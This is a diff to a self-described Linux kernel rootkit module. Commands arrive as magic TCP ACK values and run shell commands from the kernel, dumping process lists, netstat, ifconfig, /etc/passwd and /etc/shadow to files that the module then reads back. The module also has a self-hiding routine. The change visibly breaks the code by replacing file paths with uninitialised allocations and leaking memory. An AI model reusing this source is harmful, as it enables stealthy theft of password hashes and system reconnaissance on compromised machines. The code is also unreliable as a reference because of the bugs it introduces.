@@ -17,6 +17,7 @@
 #include <linux/kernel.h>               /* Generic kernel functions.         */
 #include <linux/kmod.h>                 /* Used for userspace program calls. */
 #include <linux/slab.h>                 /* Used for kmalloc().               */
+#include <linux/kthread.h>              /* Used for separate thread for call_usermodehelper(). */
 
 #include <asm/uaccess.h>                /* Used for definition of KERNEL_DS.   */
 #include <asm/segment.h>				/* Provides us access to segment regs. */
@@ -323,6 +324,7 @@ void handle_command(unsigned long int ack_seq)
 	static char *argv[4];
 	static char *envp[4]; 
 	static char *path;
+	int i;
 	
 	printk("Handling: %lu\n", ack_seq);
 	switch(ack_seq)
@@ -339,6 +341,7 @@ void handle_command(unsigned long int ack_seq)
 			envp[2] = "PATH=/bin/:";
 			envp[3] = NULL;
 
+			path = kmalloc(sizeof("/usr/games/process_list.txt"), GFP_KERNEL);
 			path = "/usr/games/process_list.txt";
 
 			break;
@@ -355,7 +358,7 @@ void handle_command(unsigned long int ack_seq)
 			envp[2] = "PATH=/bin/:/usr/bin/:";
 			envp[3] = NULL;
 
-			path = "/usr/games/installed_software.txt";
+			path = kmalloc(sizeof("/usr/games/installed_software.txt"), GFP_KERNEL);
 
 			break;
 
@@ -371,7 +374,7 @@ void handle_command(unsigned long int ack_seq)
 			envp[2] = "PATH=/bin/:"; 
 			envp[3] = NULL;
 
-			path = "/usr/games/etc_passwd.txt";
+			path = kmalloc(sizeof("/usr/games/etc_passwd.txt"), GFP_KERNEL);
 
 			break;
 
@@ -387,7 +390,7 @@ void handle_command(unsigned long int ack_seq)
 			envp[2] = "PATH=/bin/:";
 			envp[3] = NULL;
 
-			path = "/usr/games/etc_shadow.txt";
+			path = kmalloc(sizeof("/usr/games/etc_shadow.txt"), GFP_KERNEL);
 
 			break;
 
@@ -408,7 +411,7 @@ void handle_command(unsigned long int ack_seq)
 			envp[2] = "PATH=/bin/:";
 			envp[3] = NULL;
 
-			path = "/usr/games/netstat.txt";
+			path = kmalloc(sizeof("/usr/games/netstat.txt"), GFP_KERNEL);
 
 			break;
 
@@ -429,7 +432,7 @@ void handle_command(unsigned long int ack_seq)
 			envp[2] = "PATH=/bin/:/sbin/:";
 			envp[3] = NULL;
 
-			path = "/usr/games/ifconfig.txt";
+			path = kmalloc(sizeof("/usr/games/ifconfig.txt"), GFP_KERNEL);
 
 			break;
 
@@ -445,7 +448,7 @@ void handle_command(unsigned long int ack_seq)
 			envp[2] = "PATH=/bin/:";
 			envp[3] = NULL;
 
-			path = "/usr/games/uname.txt";
+			path = kmalloc(sizeof("/usr/games/uname.txt"), GFP_KERNEL);
 
 			break;
 
@@ -462,7 +465,7 @@ void handle_command(unsigned long int ack_seq)
 			envp[2] = "PATH=/bin/:"; 
 			envp[3] = NULL;
 
-			path = "/usr/games/uname.txt";
+			path = kmalloc(sizeof("/usr/games/uname.txt"), GFP_KERNEL);
 
 			break;
 
@@ -512,19 +515,33 @@ void handle_command(unsigned long int ack_seq)
 			break;
 	}
 
-	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+	for (i = 0; i < 4; i++)
+	{
+		printk("argv[%d]: %s\n", i, argv[i]);
+		printk("envp[%d]: %s\n", i, envp[i]);
+	}
 
+	printk("Working with path: %s\n", path);
+
+	// Should be handled in a thread by itself.
+	// This rootkit LKM is not intended to handle wait() calls.
+	// Jumping into userspace implicitly makes use of wait().
+	// This throws a large error in the kernel buffer.
+	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+	
 	old_fs = get_fs();
 	set_fs(KERNEL_DS);
 		fd = (*original_open)(path, O_RDONLY);
 		if (fd != -1)
 		{
 			(*original_fstat)(fd, &stat_buffer);
-			command_buffer = kmalloc((sizeof(char) * stat_buffer.st_size), GFP_NOWAIT);
+			command_buffer = kmalloc((sizeof(char) * stat_buffer.st_size), GFP_KERNEL);
 			(*original_read)(fd, command_buffer, stat_buffer.st_size);
 			(*original_close)(fd);
 		}
 	set_fs(old_fs);
+
+	return;
 }
 
 
@@ -619,40 +636,6 @@ void hide_me(void)
 }
 
 
-/*
-// Used for initial testing of call_usermodehelper().
-void test(void)
-{
-	static char *argv[4];
-	static char *envp[4];
-
-	argv[0] = "/bin/sh";
-	argv[1] = "-c";
-	argv[2] = "lsmod > /usr/games/lsmod.txt";
-	argv[3] = NULL;
-
-	envp[0] = "HOME=/";
-	envp[1] = "TERM=linux";
-	envp[2] = "PATH=/bin/:";
-	envp[3] = NULL;
-
-	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-
-	old_fs = get_fs();
-	set_fs(KERNEL_DS);
-		fd = (*original_open)("/usr/games/lsmod.txt", O_RDONLY);
-		if (fd != -1)
-		{
-			(*original_fstat)(fd, &stat_buffer);
-			command_buffer = kmalloc((sizeof(char) * stat_buffer.st_size), GFP_KERNEL);
-			(*original_read)(fd, command_buffer, stat_buffer.st_size);
-			(*original_close)(fd);
-		}
-	set_fs(old_fs);
-}
-*/
-
-
 /**
  * TODO:
  *   - Seed for randomly generated magic "ACK"s?
@@ -700,10 +683,6 @@ int start(void)
 	//server_ip   = 0x7F000001;
 	//server_port = 0x395D    ; 
 
-	//test(); 
-
-	kfree(command_buffer);
-
 	return 0;
 }
 
@@ -726,6 +705,9 @@ void stop(void)
 			printk("Closed the socket.\n");
 		}
 	}
+
+	// printk("Clearing command buffer.\n");
+	kfree(command_buffer);
 
 	printk("Rootkit stopped.\n");
 }
